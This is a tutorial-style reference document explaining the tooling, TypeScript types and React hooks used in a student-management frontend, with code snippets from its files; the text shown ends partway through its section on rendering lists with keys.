# Student Management UI — Complete Project Concepts Reference

A comprehensive learning reference covering every concept, pattern, and architectural decision used in this React + TypeScript frontend application. Each section explains **what** the concept is, **why** it was chosen, **how** it works in this specific project, and provides a **code snippet** drawn directly from the source files.

---

## Table of Contents

### Project Setup & Tooling
1. [Vite — Build Tool and Dev Server](#1-vite--build-tool-and-dev-server)
2. [React 19 + TypeScript](#2-react-19--typescript)
3. [package.json — Dependencies and Scripts](#3-packagejson--dependencies-and-scripts)
4. [tsconfig.json — Compiler Configuration](#4-tsconfigjson--compiler-configuration)
5. [Tailwind CSS v4 with @tailwindcss/vite](#5-tailwind-css-v4-with-tailwindcssvite)

### TypeScript Concepts
6. [TypeScript Interfaces](#6-typescript-interfaces)
7. [Generic Types in React](#7-generic-types-in-react)
8. [Type Inference and Explicit Typing](#8-type-inference-and-explicit-typing)
9. [Optional Properties and Union Types](#9-optional-properties-and-union-types)

### React Core Concepts
10. [Functional Components and JSX/TSX](#10-functional-components-and-jsxtsx)
11. [useState Hook](#11-usestate-hook)
12. [useEffect Hook](#12-useeffect-hook)
13. [useRef Hook](#13-useref-hook)
14. [useCallback Hook](#14-usecallback-hook)
15. [Custom Hooks](#15-custom-hooks)
16. [Props and Prop Types with TypeScript Interfaces](#16-props-and-prop-types-with-typescript-interfaces)
17. [Conditional Rendering](#17-conditional-rendering)
18. [Lists and Keys](#18-lists-and-keys)

### React Router v7
19. [BrowserRouter and Routes Setup](#19-browserrouter-and-routes-setup)
20. [Route and Path Matching](#20-route-and-path-matching)
21. [ProtectedRoute Component](#21-protectedroute-component)
22. [useNavigate Hook](#22-usenavigate-hook)
23. [useLocation Hook](#23-uselocation-hook)

### Context API
24. [React Context — createContext, Provider, useContext](#24-react-context--createcontext-provider-usecontext)
25. [Why Context over Prop Drilling](#25-why-context-over-prop-drilling)
26. [AuthContext — Token Storage in Memory](#26-authcontext--token-storage-in-memory)
27. [Auto-Logout with setTimeout](#27-auto-logout-with-settimeout)
28. [setAuthTokenGetter and setOnUnauthorized](#28-setauthtokengetter-and-setonunauthorized)

### Axios & API Layer
29. [Axios Instance](#29-axios-instance)
30. [Request Interceptor](#30-request-interceptor)
31. [Response Interceptor — 401 Handling](#31-response-interceptor--401-handling)
32. [API Modules — Separation of Concerns](#32-api-modules--separation-of-concerns)
33. [async/await with Axios](#33-asyncawait-with-axios)

### Forms — React Hook Form
34. [useForm Hook](#34-useform-hook)
35. [register Function](#35-register-function)
36. [handleSubmit](#36-handlesubmit)
37. [formState.errors](#37-formstateerrors)
38. [reset()](#38-reset)
39. [Why React Hook Form over Controlled Components](#39-why-react-hook-form-over-controlled-components)

### Component Architecture
40. [Button Component](#40-button-component)
41. [Input Component](#41-input-component)
42. [Modal Component](#42-modal-component)
43. [ConfirmDialog Component](#43-confirmdialog-component)
44. [Navbar Component](#44-navbar-component)
45. [Spinner Component](#45-spinner-component)
46. [StudentForm Component](#46-studentform-component)
47. [ProtectedRoute Component (Architecture View)](#47-protectedroute-component-architecture-view)

### State Management Patterns
48. [Lifting State Up](#48-lifting-state-up)
49. [Loading and Error States Pattern](#49-loading-and-error-states-pattern)
50. [Optimistic vs Server-Confirmed Updates](#50-optimistic-vs-server-confirmed-updates)
51. [Search and Filter State with Debouncing](#51-search-and-filter-state-with-debouncing)

### JWT on the Frontend
52. [JWT Token Storage in Memory](#52-jwt-token-storage-in-memory)
53. [JWT Decoding Without a Library](#53-jwt-decoding-without-a-library)
54. [Reading the exp Claim for Auto-Logout](#54-reading-the-exp-claim-for-auto-logout)
55. [Bearer Token Pattern](#55-bearer-token-pattern)

### Security Concepts
56. [XSS and Why localStorage is Unsafe for Tokens](#56-xss-and-why-localstorage-is-unsafe-for-tokens)
57. [Memory Storage Trade-offs](#57-memory-storage-trade-offs)
58. [401 Interceptor — Automatic Logout](#58-401-interceptor--automatic-logout)

### UI/UX Patterns
59. [Toast Notifications](#59-toast-notifications)
60. [Modal Dialogs for Create, Edit, and Delete](#60-modal-dialogs-for-create-edit-and-delete)
61. [Table with Hover Actions](#61-table-with-hover-actions)
62. [Responsive Design with Tailwind](#62-responsive-design-with-tailwind)
63. [Empty State Handling](#63-empty-state-handling)
64. [Form Validation Feedback](#64-form-validation-feedback)

### Project Architecture
65. [Folder Structure by Concern](#65-folder-structure-by-concern)
66. [Separation of Concerns](#66-separation-of-concerns)
67. [Component Composition Pattern](#67-component-composition-pattern)
68. [End-to-End Data Flow](#68-end-to-end-data-flow)

---

## Summary of All Files

| File | Purpose |
|------|---------|
| `package.json` | Project metadata, dependency declarations, npm scripts |
| `vite.config.ts` | Vite build configuration with React and Tailwind plugins |
| `index.html` | Single HTML shell; the entry point Vite serves |
| `src/main.tsx` | React tree bootstrap — mounts `<App>` into `#root` |
| `src/App.tsx` | Router setup, auth wiring, Toaster configuration |
| `src/types/index.ts` | All shared TypeScript interfaces and type aliases |
| `src/api/axiosInstance.ts` | Configured Axios instance with request/response interceptors |
| `src/api/authApi.ts` | Login and register API calls |
| `src/api/studentsApi.ts` | Full CRUD + search API calls for students |
| `src/context/AuthContext.tsx` | Global auth state: token, login, logout, auto-logout timer |
| `src/hooks/useStudents.ts` | Custom hook encapsulating all student data operations |
| `src/utils/errorHandler.ts` | Utility to extract human-readable messages from Axios errors |
| `src/utils/jwt.ts` | Minimal JWT payload decoder (base64, no library) |
| `src/components/Button.tsx` | Reusable button with variant, size, loading, and icon props |
| `src/components/ConfirmDialog.tsx` | Delete confirmation dialog built on Modal |
| `src/components/Input.tsx` | Labeled input field with error and helper text display |
| `src/components/Modal.tsx` | Overlay dialog with Escape key support and body scroll lock |
| `src/components/Navbar.tsx` | Top navigation bar with active link highlighting |
| `src/components/ProtectedRoute.tsx` | Route guard that redirects unauthenticated users to login |
| `src/components/Spinner.tsx` | Animated loading spinner with size variants |
| `src/components/StudentForm.tsx` | Reusable add/edit form using React Hook Form |
| `src/pages/LoginPage.tsx` | Login page with form validation and redirect-after-login |
| `src/pages/RegisterPage.tsx` | Registration page with password confirmation validation |
| `src/pages/StudentsPage.tsx` | Main page: student table, search, modals, CRUD orchestration |

---

## End-to-End Data Flow Diagram

```
User Action (e.g. clicks "Add Student")
        |
        v
StudentsPage.tsx
  setShowAddModal(true)  ← useState local state
        |
        v
Modal renders StudentForm
  useForm() manages uncontrolled inputs
  User fills fields, clicks "Add Student"
        |
        v
handleSubmit (React Hook Form validates)
        |
        v
handleAddSubmit(data) in StudentsPage
        |
        v
useStudents hook → createStudent(payload)
        |
        v
studentsApi.create(payload)          errorHandler.getErrorMessage()
        |                                      ^
        v                                      |
axiosInstance.post('/api/students')   on error, toast.error()
  [Request interceptor adds Bearer token]
        |
        v
Spring Boot REST API (localhost:8081)
        |
        v
Response: new Student object
        |
        v
useStudents: setStudents(prev => [...prev, newStudent])
  toast.success('Student created successfully!')
        |
        v
React re-renders StudentsPage
  New student row appears in table
  Modal closes (setShowAddModal(false))
```

---

## Project Setup & Tooling

---

### 1. Vite — Build Tool and Dev Server

**What it is**

Vite is a modern frontend build tool that provides an extremely fast development server and an optimized production bundler. It was created by Evan You (creator of Vue) and has become the de-facto standard for new React projects, replacing Create React App (CRA).

**Why it is used**

The core reason Vite is faster than CRA comes down to how it handles JavaScript modules during development:

- **CRA** (based on Webpack) bundles the entire application on every start and on every change — it processes thousands of files even if you only changed one.
- **Vite** serves files as native ES Modules directly to the browser. The browser requests only the modules it needs. On file change, Vite performs **Hot Module Replacement (HMR)** by updating only the changed module — not the whole bundle.
- **Cold start**: Vite uses `esbuild` (written in Go) to pre-bundle dependencies. `esbuild` is 10–100x faster than JavaScript-based bundlers.
- For production, Vite uses **Rollup** to produce a well-optimized bundle with code splitting.

**How it works in this project**

`vite.config.ts` registers two plugins:
1. `@vitejs/plugin-react` — enables JSX transform, Fast Refresh (HMR for React components)
2. `@tailwindcss/vite` — integrates Tailwind CSS v4 directly into Vite's transform pipeline

The `index.html` at the root is the entry point Vite serves. It contains `<script type="module" src="/src/main.tsx">` which tells the browser to load the app as a native ES module.

**Code snippet — `vite.config.ts`**

```ts
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'

export default defineConfig({
  plugins: [
    tailwindcss(),
    react(),
  ],
})
```

**Code snippet — `index.html`**

```html
<div id="root"></div>
<script type="module" src="/src/main.tsx"></script>
```

The `type="module"` attribute is what enables native ES module loading in the browser — the foundation of Vite's speed advantage.

---

### 2. React 19 + TypeScript

**What it is**

React is a JavaScript library for building user interfaces through a component-based model. TypeScript is a statically typed superset of JavaScript that compiles to plain JavaScript. Together, they produce `.tsx` files — TypeScript files that support JSX syntax.

**Why it is used**

- **React 19** brings improvements to concurrent rendering, the new `use()` hook, and better server component support. This project uses it for its stable functional component model and hooks API.
- **TypeScript** catches type errors at compile time rather than at runtime. In a project with API responses, form data, and component props, types prevent entire categories of bugs (passing the wrong shape of data, accessing a property that doesn't exist, etc.).
- **TSX** files allow writing HTML-like syntax (JSX) inside TypeScript, which React transforms into `React.createElement()` calls.

**How it works in this project**

Every component file uses the `.tsx` extension. The `React.FC` type annotation is applied to all components to declare they are functional components returning JSX.

**Code snippet — `src/main.tsx`**

```tsx
import { StrictMode } from 'react';
import { createRoot } from 'react-dom/client';
import './index.css';
import App from './App.tsx';

createRoot(document.getElementById('root')!).render(
  <StrictMode>
    <App />
  </StrictMode>
);
```

The `!` after `getElementById('root')` is a TypeScript **non-null assertion** — it tells TypeScript "I guarantee this element exists." `StrictMode` activates additional React warnings during development (it double-invokes effects and renders to surface bugs).

---

### 3. package.json — Dependencies and Scripts

**What it is**

`package.json` is the manifest file for every Node.js project. It declares the project name, version, scripts (commands you can run with `npm run`), and two categories of dependencies.

**Why it matters — dependencies vs devDependencies**

| Category | Purpose | Examples in this project |
|----------|---------|--------------------------|
| `dependencies` | Required at **runtime** — shipped to the user's browser | `react`, `axios`, `react-router-dom`, `react-hook-form`, `react-hot-toast` |
| `devDependencies` | Required only during **development/build** — never in the final bundle | `vite`, `typescript`, `tailwindcss`, `@types/*`, `eslint` |

This distinction matters for production deploys and bundle size. The bundler (Vite/Rollup) only includes what the application code imports — but keeping the separation clean makes project intent clear and speeds up CI installs with `npm ci --omit=dev`.

**Scripts explained**

```json
"scripts": {
  "dev":     "vite",              // Start the dev server with HMR
  "build":   "tsc -b && vite build", // Type-check first, then bundle for production
  "lint":    "eslint .",          // Run ESLint across the project
  "preview": "vite preview"       // Serve the production build locally
}
```

The `build` script runs `tsc -b` (TypeScript compiler) before `vite build`. This means **type errors will fail the build** — TypeScript errors are not just IDE warnings, they are a hard gate on production deployments.

**Key dependencies in this project**

```json
"dependencies": {
  "axios": "^1.14.0",
  "react": "^19.2.4",
  "react-dom": "^19.2.4",
  "react-hook-form": "^7.72.0",
  "react-hot-toast": "^2.6.0",
  "react-router-dom": "^7.13.2"
}
```

---

### 4. tsconfig.json — Compiler Configuration

**What it is**

`tsconfig.json` is TypeScript's configuration file. It controls how the TypeScript compiler (`tsc`) interprets and checks the source code. It defines things like how strict the type checking should be, how modules are resolved, and what JSX transform to use.

**Why it is used**

Without `tsconfig.json`, TypeScript uses defaults that are permissive and may not catch common errors. A well-configured `tsconfig.json` enforces code quality standards across the whole team automatically.

**Key settings relevant to this project**

| Option | Value | What it does |
|--------|-------|-------------|
| `strict` | `true` | Enables all strict type checks: `noImplicitAny`, `strictNullChecks`, `strictFunctionTypes`, etc. |
| `target` | `ES2020` | Compiles to modern JavaScript — safe for all current browsers |
| `module` | `ESNext` | Uses native ES module syntax (`import`/`export`) |
| `moduleResolution` | `bundler` | Optimized for bundlers like Vite — resolves modules the way Vite expects |
| `jsx` | `react-jsx` | Uses the modern JSX transform (no need to `import React` in every file) |
| `noUnusedLocals` | `true` | Errors on variables declared but never used |
| `noUnusedParameters` | `true` | Errors on function parameters declared but never used |
| `noFallthroughCasesInSwitch` | `true` | Prevents accidental `switch` fallthrough |

**Why `strict: true` matters**

Without `strict`, TypeScript allows:
```ts
// Without strict — this compiles fine but crashes at runtime
function greet(name: string) { return name.toUpperCase(); }
greet(undefined); // Runtime TypeError!
```
With `strict` and `strictNullChecks`, the above is a compile-time error.

---

### 5. Tailwind CSS v4 with @tailwindcss/vite

**What it is**

Tailwind CSS is a utility-first CSS framework. Instead of writing custom CSS classes, you compose design directly in HTML/JSX using small, single-purpose utility classes like `flex`, `px-4`, `text-sm`, `bg-indigo-600`.

Tailwind CSS v4 is a major rewrite — it eliminates the traditional `tailwind.config.js` file and integrates directly into the build pipeline as a PostCSS/Vite plugin.

**Why utility-first CSS**

Traditional CSS approaches require:
1. Creating a class name (`.student-card-header`)
2. Writing CSS rules in a separate file
3. Maintaining the mapping between names and styles

Tailwind eliminates steps 1 and 2. The styles live directly in the component, making it easy to see exactly how something looks without jumping between files. This colocation improves maintainability especially in component-based architectures.

**Why no config file is needed in v4**

Tailwind v4 uses **CSS-first configuration**. Instead of a JavaScript config file, you configure Tailwind directly in your CSS file using `@theme` directives. The `@tailwindcss/vite` plugin handles everything at the Vite transform level, scanning your source files for class names and generating only the CSS you actually use — no config file required for standard usage.

**How it works in this project**

The plugin is registered in `vite.config.ts`:

```ts
import tailwindcss from '@tailwindcss/vite'

export default defineConfig({
  plugins: [
    tailwindcss(),  // Processes Tailwind directives and generates CSS
    react(),
  ],
})
```

Tailwind classes are used directly in JSX throughout every component:

```tsx
// From Button.tsx — complete styling via utilities, no custom CSS
<button
  className={`
    inline-flex items-center justify-center gap-2 rounded-lg font-medium
    transition-colors duration-150 focus:outline-none focus:ring-2 focus:ring-offset-2
    cursor-pointer disabled:cursor-not-allowed
    ${variantClasses[variant]}
    ${sizeClasses[size]}
    ${className}
  `}
>
```

---

## TypeScript Concepts

---

### 6. TypeScript Interfaces

**What they are**

An `interface` in TypeScript defines the shape (structure) of an object — what properties it has and what types those properties are. Interfaces are erased at compile time and produce zero runtime overhead.

**Why they are used**

Interfaces serve as a contract between different parts of the application. When the API returns a student object, when a component receives a student as a prop, and when a form submits student data — all these must agree on the same shape. Defining it once in `types/index.ts` and importing it everywhere ensures consistency.

**How they work in this project**

All shared types live in `src/types/index.ts`. The file defines interfaces for every major data shape the application works with.

**Code snippet — `src/types/index.ts`**

```ts
// Auth types
export interface LoginRequest {
  username: string;
  password: string;
}

export interface AuthResponse {
  token: string;
}

// Student types
export interface Student {
  id: number;
  firstName: string;
  lastName: string;
  email: string;
}

export interface CreateStudentRequest {
  firstName: string;
  lastName: string;
  email: string;
}

// Auth context types
export interface AuthContextType {
  token: string | null;
  isAuthenticated: boolean;
  login: (token: string) => void;
  logout: () => void;
}
```

Notice that `Student` has an `id` field but `CreateStudentRequest` does not — because the server assigns the `id` upon creation. This is intentional modeling: separate types for separate concerns rather than one "catch-all" type with optional fields.

---

### 7. Generic Types in React

**What they are**

Generics allow writing code that works with different types while still being type-safe. The syntax is `SomeType<T>` where `T` is a type parameter that gets filled in at the call site.

**Why they are used**

Without generics, `useState` would have to return `any`, losing all type safety. With generics, `useState<Student[]>` tells TypeScript exactly what shape the state holds, enabling autocomplete and catching errors.

**How they work in this project**

Generics appear throughout the hooks and API layer.

**Code snippet — `src/hooks/useStudents.ts`**

```ts
// useState<Student[]> — state is specifically typed as an array of Student
const [students, setStudents] = useState<Student[]>([]);

// useState<string | null> — state is a string or null
const [error, setError] = useState<string | null>(null);
```

**Code snippet — `src/api/studentsApi.ts`**

```ts
// axiosInstance.get<Student[]> — tells TypeScript the response.data is Student[]
const response = await axiosInstance.get<Student[]>('/api/students');
return response.data; // TypeScript knows this is Student[]

// axiosInstance.post<Student> — response.data is a single Student
const response = await axiosInstance.post<Student>('/api/students', data);
```

**Code snippet — `src/context/AuthContext.tsx`**

```ts
// useRef<ReturnType<typeof setTimeout> | null> — typed ref for a timer handle
const logoutTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
```

`ReturnType<typeof setTimeout>` is itself a generic utility type that resolves to whatever type `setTimeout` returns (a `NodeJS.Timeout` or `number` depending on environment).

---

### 8. Type Inference and Explicit Typing

**What it is**

TypeScript can often infer types automatically from context (type inference), but sometimes you must declare the type explicitly. Knowing when each is appropriate is a key TypeScript skill.

**Why it matters**

Over-annotating types is verbose and reduces readability. Under-annotating loses the safety guarantees. The principle is: let TypeScript infer where it can; annotate where it cannot.

**How it works in this project**

TypeScript infers the return type of functions from the `return` statement:

```ts
// TypeScript infers: () => string
const getLabel = () => 'hello';

// TypeScript infers: Student[] from the useState default
// but we annotate explicitly because [] alone has type never[]
const [students, setStudents] = useState<Student[]>([]);
```

Explicit typing is used for function parameters (TypeScript cannot infer these) and component props:

```ts
// From useStudents.ts — parameter type must be explicit
const searchStudents = useCallback(
  async (type: 'email' | 'lastName' | 'firstName', value: string) => {
    ...
  },
  [fetchAll]
);
```

Return types on async functions are often explicit to communicate intent:

```ts
// authApi.ts — explicit Promise<AuthResponse> return type
login: async (data: LoginRequest): Promise<AuthResponse> => {
  const response = await axiosInstance.post<AuthResponse>('/api/auth/login', data);
  return response.data;
},
```

---

### 9. Optional Properties and Union Types

**What they are**

- **Optional properties** use `?` to mark a property as possibly `undefined`: `label?: string`
- **Union types** use `|` to say a value can be one of several types: `string | null`

**Why they are used**

Real-world data is not always complete. A button might or might not have a label. A token might be present or absent. These concepts let TypeScript model reality accurately.

**How they work in this project**

**Code snippet — `src/components/Button.tsx`**

```ts
interface ButtonProps extends React.ButtonHTMLAttributes<HTMLButtonElement> {
  variant?: Variant;      // Optional — defaults to 'primary'
  size?: Size;            // Optional — defaults to 'md'
  loading?: boolean;      // Optional — defaults to false
  leftIcon?: React.ReactNode; // Optional — no default
}
```

**Code snippet — `src/types/index.ts`**

```ts
export interface AuthContextType {
  token: string | null;  // Union type — token is a string when logged in, null when not
  ...
}
```

**Code snippet — `src/components/StudentForm.tsx`**

```ts
interface StudentFormProps {
  initialData?: Student;  // Optional — present when editing, absent when creating
  onSubmit: (data: CreateStudentRequest) => Promise<void>;
  onCancel: () => void;
  loading?: boolean;
}
```

The `initialData?: Student` pattern is what makes `StudentForm` reusable for both add and edit operations. Inside the component, `initialData` is checked:

```ts
defaultValues: initialData
  ? { firstName: initialData.firstName, lastName: initialData.lastName, email: initialData.email }
  : { firstName: '', lastName: '', email: '' },
```

---

## React Core Concepts

---

### 10. Functional Components and JSX/TSX

**What they are**

A functional component is a JavaScript function that accepts a `props` object and returns JSX. JSX is a syntax extension that looks like HTML but compiles to `React.createElement()` calls. TSX is JSX with TypeScript.

**Why they are used**

Functional components replaced class components as the primary React paradigm when hooks were introduced in React 16.8. They are simpler, more composable, and easier to test. Class components required lifecycle methods (`componentDidMount`, `componentDidUpdate`) which are harder to reason about than the hook-based equivalents.

**How they work in this project**

Every UI element in this project is a functional component typed with `React.FC`:

**Code snippet — `src/components/Spinner.tsx`**

```tsx
const Spinner: React.FC<SpinnerProps> = ({ size = 'md', className = '' }) => {
  return (
    <div
      className={`inline-block animate-spin rounded-full border-indigo-600 border-t-transparent ${sizeMap[size]} ${className}`}
      role="status"
      aria-label="Loading"
    />
  );
};
```

`React.FC<SpinnerProps>` is shorthand for `React.FunctionComponent<SpinnerProps>` — it types the function as a React component that accepts `SpinnerProps` and returns `ReactElement | null`.

JSX curly braces `{}` are used to interpolate JavaScript expressions into the markup. Template literals inside `className` dynamically build CSS class strings.

---

### 11. useState Hook

**What it is**

`useState` is a React hook that adds local state to a functional component. It returns a pair: the current state value and a setter function. Calling the setter triggers a re-render.

**Why it is used**

State is data that can change over time and must cause the UI to update when it does. Without `useState`, a component would be a pure function of its props — static. `useState` is the mechanism that makes components dynamic and interactive.

**How it works in this project**

`useState` is used extensively in `StudentsPage` to manage UI state that does not need to be shared globally:

**Code snippet — `src/pages/StudentsPage.tsx`**

```tsx
// Modal visibility state
const [showAddModal, setShowAddModal] = useState(false);
const [editingStudent, setEditingStudent] = useState<Student | null>(null);
const [deletingStudent, setDeletingStudent] = useState<Student | null>(null);
const [deleteLoading, setDeleteLoading] = useState(false);

// Search state
const [searchType, setSearchType] = useState<SearchType>('lastName');
const [searchValue, setSearchValue] = useState('');
```

When a user clicks the edit button on a row, `setEditingStudent(student)` is called. This triggers a re-render; `editingStudent` is now non-null, so the edit modal renders. When the user closes the modal, `setEditingStudent(null)` is called, triggering another re-render that hides the modal.

In `src/hooks/useStudents.ts`, `useState` manages the shared data state:

```ts
const [students, setStudents] = useState<Student[]>([]);
const [loading, setLoading] = useState(false);
const [error, setError] = useState<string | null>(null);
```

---

### 12. useEffect Hook

**What it is**

`useEffect` is a hook that lets you perform side effects in functional components. A side effect is anything that reaches outside the component: fetching data, setting up event listeners, manipulating the DOM, setting timers.

**Why it is used**

React renders are designed to be pure — a component should return the same JSX for the same props and state. Side effects need to be separated from the render phase and placed in `useEffect`, which runs after rendering.

The **dependency array** (second argument) controls when the effect re-runs:
- `[]` — run once after the first render (replaces `componentDidMount`)
- `[a, b]` — run after any render where `a` or `b` changed
- No array — run after every render (rarely the right choice)

The **cleanup function** (returned from the effect) runs before the next effect execution and on unmount — it is used to cancel subscriptions, clear timers, and remove event listeners.

**How it works in this project**

**Code snippet — `src/pages/StudentsPage.tsx`**

```tsx
// Fetch all students when the component first mounts
useEffect(() => {
  fetchAll();
}, [fetchAll]);
```

**Code snippet — `src/components/Modal.tsx`**

```tsx
// Add Escape key listener when modal opens; remove it when it closes
useEffect(() => {
  if (!isOpen) return;
  const handler = (e: KeyboardEvent) => {
    if (e.key === 'Escape') onClose();
  };
  document.addEventListener('keydown', handler);
  return () => document.removeEventListener('keydown', handler); // Cleanup
}, [isOpen, onClose]);

// Prevent background scroll when modal is open
useEffect(() => {
  if (isOpen) {
    document.body.style.overflow = 'hidden';
  } else {
    document.body.style.overflow = '';
  }
  return () => {
    document.body.style.overflow = ''; // Cleanup on unmount
  };
}, [isOpen]);
```

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
// Cleanup the auto-logout timer when AuthProvider unmounts
useEffect(() => {
  return () => {
    if (logoutTimerRef.current) {
      clearTimeout(logoutTimerRef.current);
    }
  };
}, []);
```

---

### 13. useRef Hook

**What it is**

`useRef` returns a mutable object `{ current: value }` that persists across renders. Unlike `useState`, mutating `.current` does NOT trigger a re-render. It has two main use cases: (1) holding a reference to a DOM element, and (2) storing a mutable value that should not cause re-renders.

**Why it is used**

For timers, the timer ID needs to be stored so it can be cancelled, but storing it in state would cause unnecessary re-renders every time the timer is set or cleared. `useRef` is the correct tool here — it persists the value without triggering renders.

**How it works in this project**

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
// The timer handle is stored in a ref — changing it never re-renders the provider
const logoutTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

const scheduleAutoLogout = useCallback((tok: string) => {
  if (logoutTimerRef.current) {
    clearTimeout(logoutTimerRef.current); // Cancel any existing timer
  }
  // ...
  logoutTimerRef.current = setTimeout(() => {
    logout();
  }, msUntilExpiry);
}, [logout]);
```

Also used implicitly by `forwardRef` in `Input.tsx` — when React Hook Form uses `register()`, it needs a DOM ref to the input element to manage focus and value:

```tsx
// Input.tsx uses forwardRef so React Hook Form can attach its own ref
const Input = forwardRef<HTMLInputElement, InputProps>(
  ({ label, error, helperText, className = '', id, ...rest }, ref) => {
    return (
      <input ref={ref} ... />
    );
  }
);
```

---

### 14. useCallback Hook

**What it is**

`useCallback` memoizes a function — it returns the same function reference between renders unless one of its dependencies changes. This prevents unnecessary re-renders of child components that receive the function as a prop, and satisfies the `useEffect` dependency array requirement for stable function references.

**Why it is used**

In `useStudents.ts`, functions like `fetchAll` are listed as dependencies in `useEffect` in `StudentsPage`. If `fetchAll` were re-created on every render (as regular functions are), the effect would run on every render, causing infinite fetch loops. `useCallback` ensures `fetchAll` is only recreated when its own dependencies change.

**How it works in this project**

**Code snippet — `src/hooks/useStudents.ts`**

```ts
// fetchAll has no dependencies — it's created once and reused forever
const fetchAll = useCallback(async () => {
  setLoading(true);
  setError(null);
  try {
    const data = await studentsApi.getAll();
    setStudents(data);
  } catch (err) {
    const msg = getErrorMessage(err);
    setError(msg);
    toast.error(msg);
  } finally {
    setLoading(false);
  }
}, []); // Empty array: this function is stable

// searchStudents depends on fetchAll — recreated only if fetchAll changes
const searchStudents = useCallback(
  async (type: 'email' | 'lastName' | 'firstName', value: string) => {
    if (!value.trim()) {
      fetchAll(); // Uses the stable fetchAll reference
      return;
    }
    ...
  },
  [fetchAll]
);
```

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
const logout = useCallback(() => {
  setToken(null);
  if (logoutTimerRef.current) {
    clearTimeout(logoutTimerRef.current);
    logoutTimerRef.current = null;
  }
}, []); // logout is stable — never recreated
```

---

### 15. Custom Hooks

**What they are**

A custom hook is a JavaScript function whose name starts with `use` and that calls other hooks internally. Custom hooks let you extract stateful logic from components and share it between them without changing the component hierarchy.

**Why they are used**

Without custom hooks, `StudentsPage` would contain all the state management logic for students (loading, error, fetch, create, update, delete, search) alongside its rendering logic. This mixing of concerns makes components long, hard to test, and hard to reuse.

By extracting into `useStudents`, the hook can be tested independently and potentially reused in other pages without duplicating any logic.

**How it works in this project**

**Code snippet — `src/hooks/useStudents.ts`**

```ts
export function useStudents() {
  const [students, setStudents] = useState<Student[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const fetchAll = useCallback(async () => { ... }, []);
  const createStudent = useCallback(async (payload) => { ... }, []);
  const updateStudent = useCallback(async (id, payload) => { ... }, []);
  const deleteStudent = useCallback(async (id) => { ... }, []);
  const searchStudents = useCallback(async (type, value) => { ... }, [fetchAll]);

  return { students, loading, error, fetchAll, createStudent, updateStudent, deleteStudent, searchStudents };
}
```

**Code snippet — `src/pages/StudentsPage.tsx` (consuming the hook)**

```tsx
const {
  students,
  loading,
  error,
  fetchAll,
  createStudent,
  updateStudent,
  deleteStudent,
  searchStudents,
} = useStudents();
```

`StudentsPage` is now only responsible for rendering — it delegates all data concerns to `useStudents`. This is the **separation of concerns** principle applied to React components.

---

### 16. Props and Prop Types with TypeScript Interfaces

**What they are**

Props (properties) are the mechanism by which parent components pass data and callbacks to child components. In TypeScript, an interface defines the exact shape and types of these props, catching misuse at compile time.

**Why they are used**

Without typed props, you could pass the wrong data type to a component and only discover the bug at runtime. With TypeScript interfaces, the compiler flags every misuse immediately.

**How they work in this project**

**Code snippet — `src/components/ConfirmDialog.tsx`**

```tsx
interface ConfirmDialogProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: () => void;
  title: string;
  message: string;
  confirmLabel?: string;  // Optional with default
  loading?: boolean;      // Optional with default
}

const ConfirmDialog: React.FC<ConfirmDialogProps> = ({
  isOpen,
  onClose,
  onConfirm,
  title,
  message,
  confirmLabel = 'Delete',  // Default value destructuring
  loading = false,
}) => { ... };
```

When `StudentsPage` uses `ConfirmDialog`, TypeScript verifies every required prop is provided with the right type:

```tsx
<ConfirmDialog
  isOpen={!!deletingStudent}   // boolean ✓
  onClose={() => setDeletingStudent(null)}  // () => void ✓
  onConfirm={handleDeleteConfirm}          // () => void ✓
  title="Delete Student"                   // string ✓
  message={`Are you sure...`}              // string ✓
  loading={deleteLoading}                  // boolean ✓
/>
```

---

### 17. Conditional Rendering

**What it is**

Conditional rendering means displaying different UI based on state or props. React supports several patterns: ternary operators, `&&` short-circuit evaluation, and early returns.

**Why it is used**

A real application has many states: loading, error, empty, populated, authenticated, unauthenticated. Each state needs a different UI. Conditional rendering is the mechanism to express these differences.

**How it works in this project**

**Code snippet — `src/pages/StudentsPage.tsx` (multiple patterns)**

```tsx
// Ternary: loading spinner OR table content
{loading && students.length === 0 ? (
  <div className="flex items-center justify-center py-24">
    <Spinner size="lg" />
    <p className="text-sm text-gray-500">Loading students...</p>
  </div>
) : students.length === 0 ? (
  // Nested ternary: empty state
  <div className="flex flex-col items-center justify-center py-24 text-center">
    <p className="text-gray-900 font-medium">No students found</p>
  </div>
) : (
  // Normal table
  <table>...</table>
)}

// && operator: show error banner only when there is an error
{error && !loading && (
  <div className="rounded-xl bg-red-50 ...">
    <p className="text-sm text-red-700">{error}</p>
  </div>
)}

// && operator: show loading overlay only when refreshing
{loading && students.length > 0 && (
  <div className="flex items-center justify-center gap-2 py-3 bg-indigo-50">
    <Spinner size="sm" />
    <span className="text-xs text-indigo-600">Updating...</span>
  </div>
)}
```

**Code snippet — `src/components/Navbar.tsx`**

```tsx
// Ternary for authenticated vs unauthenticated navigation
{isAuthenticated ? (
  <Button variant="secondary" size="sm" onClick={handleLogout}>
    Sign Out
  </Button>
) : (
  <div className="flex items-center gap-2">
    <Link to="/login">Sign In</Link>
    <Link to="/register"><Button size="sm">Register</Button></Link>
  </div>
)}
```

---

### 18. Lists and Keys

**What it is**

When rendering arrays of items in React, you use `.map()` to transform each array item into a JSX element. Each element must have a unique `key` prop so React can efficiently track which items changed, were added, or were removed.

**Why keys matter**

React uses keys to reconcile the virtual DOM with the actual DOM. Without keys, React falls back to re-rendering entire lists on any change. With stable, unique keys, React can update only the specific elements that changed.

**Why you should NOT use array index as key**

Using the array index (`key={index}`) causes bugs when items are reordered or deleted — React would incorrectly reuse DOM elements. A unique, stable ID from the data (like `student.id`) is always the correct choice.

**How it works in this project**

**Code snippet — `src/pages/StudentsPage.tsx`**

```tsx
// students.map creates one <StudentRow> per student
// key={student.id} uses the database ID — stable and unique
<tbody className="divide-y divide-gray-100">
  {students.map((student) => (
    <StudentRow
      key={student.id}           // Unique stable key from server
      student={student}
      onEdit={() => setEditingStudent(student)}
      onDelete={() => setDeletingStudent(student)}
    />
  ))}
</tbody>
```

The search type toggle buttons also use keys:

```tsx
{(Object.keys(searchTypeLabels) as SearchType[]).map((type) => (
  <button
    key={type}  // 'email', 'lastName', 'firstName' — stable string keys
